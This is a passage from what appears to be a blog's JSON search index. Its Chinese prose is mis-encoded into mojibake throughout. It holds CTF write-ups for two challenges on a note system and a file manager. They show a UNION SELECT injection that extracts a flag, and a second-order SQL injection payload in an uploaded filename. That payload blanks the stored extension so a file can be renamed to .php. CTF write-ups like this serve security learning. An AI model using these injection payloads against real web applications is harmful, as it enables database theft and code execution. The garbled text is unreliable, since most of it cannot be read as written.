æ€è€ƒèƒ½ä¸èƒ½ç”¨è¿™æ ·çš„è¯­å¥ï¼šselect * from note limit 0,1 union select 2 ï¼ˆï¼ï¼ï¼ 5.7 ä»¥å limit å¿…é¡»è¦æ”¾åœ¨æœ€åï¼Œ5.7ä»¥å‰æ˜¯å¯ä»¥çš„ï¼‰ 5.7 ä»¥åä¼šæŠ¥ï¼šERROR 1221 (HY000): Incorrect usage of UNION and LIMIT åˆ©ç”¨ é‚£ä¹ˆç°åœ¨å°±å¯ä»¥åˆ©ç”¨äº†ï¼š åœ¨ mysql é‡Œè¿è¡Œï¼š è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„è·å¾— 16è¿›åˆ¶ äº†ï¼ˆåªè¦è½¬æˆ ASCII å°±å¯ä»¥äº†ï¼‰ã€‚ åŠ ä¸Š 0x å¡«ä¸Šå»æäº¤ï¼š åˆ°å‰å°ï¼š å¯ä»¥çœ‹åˆ° 3 å’Œ 2 è¢«æ˜¾ç¤ºå‡ºæ¥äº†ã€‚ã€‚çœ‹å›ä¸€å¼€å§‹æ‹¿åˆ°çš„æ•°æ®åº“ç»“æ„ï¼Œå‘ç°æœ‰ä¸ªflags è¡¨å’Œ flag å­—æ®µï¼Œæ„é€ ä¸€ä¸‹å°±å¯ä»¥å‡ºæ¥äº†ã€‚ã€‚ çªç„¶çš„ç»“æŸï¼Œæ˜¯å› ä¸ºæ‡’","path":"2018/09/09/è“é²¸ç¬”è®°ç®¡ç†ç³»ç»Ÿ/","date":"09-09","excerpt":""},{"title":"è“é²¸æ–‡ä»¶ç®¡ç†ç³»ç»Ÿï¼ˆå¡”ä¸»nbï¼‰","text":"è“é²¸å®˜ç½‘æœ¬é¢˜æºç  é¢˜ç›®æè¿°ï¼š 1è“é²¸ä¸ºäº†æ•´ç†è‡ªå·±çš„å·¥å…·ï¼Œå¼€å‘äº†ä¸€ä¸ªæ–‡ä»¶ç®¡ç†ç³»ç»Ÿï¼Œæœ¬æ¥å¯¹ç³»ç»Ÿçš„åŠŸèƒ½å¾ˆæ»¡æ„ï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆæ€»æœ‰äººæŠŠè“é²¸çš„æ–‡ä»¶åä¿®æ”¹äº†ï¼Ÿè“é²¸æ‰¾åˆ°äº†æœºæ™ºçš„ä½ å¸®åŠ©å®ƒå®¡è®¡ä»£ç ~ è¿™é¢˜ä¸€å¼€å§‹ç›´æ¥ç»™äº†æºç ã€‚ é¦–å…ˆå…ˆçœ‹çœ‹ä¸Šä¼ çš„ä»£ç ï¼ˆuplaod.phpï¼‰ï¼š è¿™é‡Œä¸¤ä¸ªå…³é”®ç‚¹ï¼š 121. é™åˆ¶äº†æ–‡ä»¶çš„åç¼€å2. æ’å…¥è¿›æ•°æ®åº“ é¦–å…ˆæƒ³æƒ³èƒ½ä¸èƒ½è¿™æ ·ï¼š è¿™æ ·æ˜¯ä¸è¡Œå¾—ã€‚ã€‚å› ä¸ºåœ¨ä¸‹é¢çš„æ‹¼æ¥æ–‡ä»¶åçš„æ—¶å€™ç”¨çš„ä¹Ÿæ˜¯è¿™ä¸ªåç¼€ï¼š1$name = $path_parts[\"filename\"] . $path_parts[\"extension\"]; //æ­¤ä¸ºä¸Šä¼ çš„æ–‡ä»¶å æ ¹æ®é¢˜ç›®æè¿°ï¼Œæˆ‘ä»¬çœ‹çœ‹ rename.phpï¼š è¿™é‡Œçš„ $req åœ¨ common.inc.php ä¸­æ˜¯è¿™ä¹ˆå®šä¹‰çš„ï¼š 12345foreach(array($_GET, $_POST, $_COOKIE) as $global_var) &#123; foreach($global_var as $key =&gt; $value) &#123; is_string($value) &amp;&amp; $req[$key] = addslashes($value); &#125;&#125; ç±»ä¼¼è‡ªåŠ¨è§£æäº†å§ã€‚ é‡‡å‘ å‡è®¾æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åä¸ºï¼štest.jpg è¿™æ— è®ºå¦‚ä½•éƒ½ä¼šåœ¨æ–°æ–‡ä»¶åååŠ ä¸Š $result[&#39;extension&#39;] åœ¨è¿™é‡Œèµ·åˆæƒ³ç»•è¿‡ rename ï¼Œå³ç±»ä¼¼ move_uploaded_file å‡½æ•°ä¸€æ ·ï¼Œä¼ å…¥ windows æ–‡ä»¶åä¸­ä¸å…è®¸çš„å­—ç¬¦ï¼Œç±»ä¼¼ï¼šnewname.php.php;.jpg æˆ–è€… newname.php.php/.jpg(ä¸¤ä¸ª .php æ˜¯å› ä¸ºåœ¨ç¬¬22è¡Œä¼šå¯¹$newnameè¿›è¡Œä¸€æ¬¡ basenameæ“ä½œ) ä½†æ˜¯è²Œä¼¼ rename å‡½æ•°ä¼šæŠ¥é”™ï¼ˆæ€»ä¹‹å°±æ˜¯ä¸è¡Œï¼ŒåŸè°…æˆ‘çœ‹ä¸æ‡‚å†…æ ¸ä»£ç ï¼‰ æ”¾å¼ƒè¿™ä¸ªæƒ³æ³•ï¼Œçœ‹äº†å¸ˆå‚…çš„ WP åå‘ç°ï¼š å…³é”®ç‚¹åœ¨ 23è¡Œçš„ update è¯­å¥ï¼š 1update `file` set `filename`=&apos;&#123;$req[&apos;newname&apos;]&#125;&apos;, `oldname`=&apos;&#123;$result[&apos;filename&apos;]&#125;&apos; where `fid`=&#123;$result[&apos;fid&apos;]&#125; $result æ˜¯åœ¨ ç¬¬13è¡Œ æ ¹æ®ä¼ å…¥çš„æ–‡ä»¶åæŸ¥è¯¢å‡ºæ¥çš„ã€‚ è¿™é‡ŒæŠŠ oldname å­—æ®µè®¾ç½®æˆäº† $result[&#39;filename&#39;]ã€‚ è¿™é‡Œçš„ $result[â€˜filenameâ€™] æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œä¸”æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ã€‚è™½ç„¶ä¼ å…¥çš„æ—¶å€™ç»è¿‡äº† addslashes çš„è¿‡æ»¤ï¼ˆåœ¨ common.inc.php ä¸­ï¼‰ï¼Œä½†æ˜¯æŸ¥è¯¢å‡ºæ¥åå´æ²¡æœ‰è¿‡æ»¤ã€‚ å¯æ§æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå‰é¢åˆ†æè¿‡è¿™é‡Œæœ€å¤§çš„é—®é¢˜åœ¨æ”¹çš„æ–°åå­—ä¼šè¢«å¼ºåˆ¶åŠ ä¸Š $result[&#39;extension&#39;]ã€‚ä½†æ˜¯è¿™é‡Œæ˜¯å¯ä»¥æ³¨å…¥çš„ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬çš„æ–‡ä»¶åå¤Ÿéªšï¼Œæˆ‘ä»¬å°±èƒ½æ“ä½œ update è¯­å¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°† extension å­—æ®µè¦†ç›–ä¸ºç©ºã€‚ æ¯”å¦‚ï¼š&#39;,extension=&#39;&#39;,filename=&#39;test.jpgï¼ˆæœ€åè¦ä¸º .jpg ï¼‰ æ­¤æ—¶æ•°æ®åº“å’Œæ–‡ä»¶å¤¹é‡Œçš„æƒ…å†µï¼š æ­¤æ—¶å»æ”¹åï¼Œä¼ å…¥æ–‡ä»¶åï¼š&#39;,extension=&#39;&#39;,filename=&#39;test(å»æ‰åç¼€)æ–°æ–‡ä»¶åä¼ å…¥ï¼štest æ­¤æ—¶çš„sqlè¯­å¥ï¼š1sqlï¼šupdate `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test&apos; where `fid`=2 å†çœ‹çœ‹ï¼š okï¼ŒæˆåŠŸè¸©å‘ã€‚æ­¤æ—¶å‘ç°æ•°æ®ä¸­çš„ filename å’Œ æ–‡ä»¶å¤¹ä¸­çš„ä¸åŒã€‚ä¸‹æ¬¡ rename çš„æ—¶å€™ä¼šæ‰¾ä¸åˆ° test æ–‡ä»¶ï¼ˆæ­¤æ—¶æ•°æ®åº“ä¸­çš„ extension å·²ç»ä¸ºç©ºï¼‰ lastæˆ‘ä»¬æŠŠä¸Šä¼ çš„æ–‡ä»¶åæ”¹æ”¹ï¼š&#39;,extension=&#39;&#39;,filename=&#39;test.jpg.jpg æ­¤æ—¶çš„è¯­å¥ï¼š1update `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test.jpg&apos; where `fid`=3 ä¼šå‘ç°æŠŠ filename è®¾ç½®æˆäº† test.jpg äº†ï¼Œæ­¤æ—¶æ•°æ®åº“ä¸æ–‡ä»¶å¤¹ä¸€è‡´ï¼ˆä¸æƒ³æˆªå›¾äº†ã€‚ã€‚ï¼‰ å†æ”¹æ¬¡åï¼š12oldnameï¼štest.jpgnewnameï¼štest.php å³å¯ã€‚","path":"2018/09/09/è“é²¸æ–‡ä»¶ç®¡ç†ç³»ç»Ÿ/","date":"09-09","excerpt":""},{"title":"Nothingã€‚ã€‚ã€‚","text":":)","path":"2018/09/09/hello-world/","date":"09-09","excerpt":""}]}